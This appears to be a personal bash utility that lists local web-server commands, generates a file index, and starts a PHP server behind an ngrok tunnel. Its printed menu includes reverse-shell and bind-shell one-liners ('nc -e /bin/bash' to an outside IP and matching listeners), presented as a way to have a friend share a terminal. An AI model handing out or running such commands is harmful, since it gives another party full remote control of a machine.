Black='\033[0;30m'
Red='\033[0;31m'
Green='\033[0;32m'
IGreen='\033[0;92m'
Yellow='\033[0;33m'
IYellow='\033[0;93m'
Blue='\033[0;34m'
Purple='\033[0;35m'
Cyan='\033[0;36m'
White='\033[0;37m'
clear='\033[0m'


#pending
# 1 ngrok vpn connect
# 1 internet connection check
# setup to github
clear;ls -la |grep "^-"|awk '{print $NF}'|awk '{print "<b><a href=\""$1"\">"$NF"</a></b><br />"}'|awk '!/index.html/' >index.html
chmod a=r index.html;chmod u=rw index.html
ifcnoio=$(ifconfig|grep 192|awk '{print $2}')
vppo=$(echo $vport)
vport=$(cat $HOME/.vf)
echo -e "
[${Green}✔${clear}] ${Yellow}Local server scripts:${clear}
\t${IGreen}├──${clear} python -m SimpleHTTPServer 8000
\t${IGreen}├──${clear} python3 -m SimpleHTTPServer 8000
\t${IGreen}├──${clear} twistd -n web -p 8000 --path .
\t${IGreen}├──${clear} ruby -run -ehttpd . -p8000
\t${IGreen}├──${clear} php -S localhost:8000
\t${IGreen}└──${clear} php -S $ifcnoio:8000

[${Green}✔${clear}] ${Yellow}VPN Reverse Connect server scripts:${clear}
[${Green}✔${clear}] ${IYellow}ACCESS TERMINAL${clear}
[${Green}✔${clear}] ${Yellow}ASK YOUR FRINED TO RUN SCRIPT${clear}
\t${IGreen}├──${clear} ${Green}nc -e /bin/bash 193.161.193.99 $vport ${clear}
\t${IGreen}└──${clear} ${Green}ncat -e /bin/bash 193.161.193.99 $vport${clear}

[${Green}✔${clear}] ${Yellow}LISTENER FOR YOU${clear}
\t${IGreen}├──${clear} ${Green}ncat -klvp $port ${clear}
\t${IGreen}└──${clear} ${Green}nc -klvp $port ${clear}

[${Green}✔${clear}] ${IYellow}SHARE TERMINAL${clear}
[${Green}✔${clear}] ${Yellow}ASK YOUR FRINED TO RUN SCRIPT${clear}
\t${IGreen}├──${clear} ${Green}nc -v -n 193.161.193.99 $vport ${clear}
\t${IGreen}└──${clear} ${Green}ncat -v -n 193.161.193.99 $vport ${clear}

[${Green}✔${clear}] ${Yellow}LISTENER FOR YOU${clear}
\t${IGreen}├──${clear} ${Green}ncat -k -l -p $port -e /bin/bash${clear}
\t${IGreen}└──${clear} ${Green}nc -k -l -p $port -e /bin/bash${clear}"
pkill php
pkill ngrok

php -S localhost:5555 > /dev/null 2>&1 &
#Starting ngrok
echo
echo -e "[${Green}✔${clear}] ${Yellow}GENERATING LINK PLEASE WAIT... ${clear}"

$HOME/ngrok http 5555 > /dev/null 2>&1 &
sleep 7
#below lines can be sued for generating direct link.
ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels|sed 's#"# #g'|sed 's#http#\nhttp#g'|sed 's#.io#.io\n#g'|grep https|head -n 1)

echo -e "\t${IGreen}├──${clear} ${Green}$ngrok_link ${clear}"
echo -e "\t${IGreen}└──${clear} ${Green}http://localhost:5555 ${clear}"

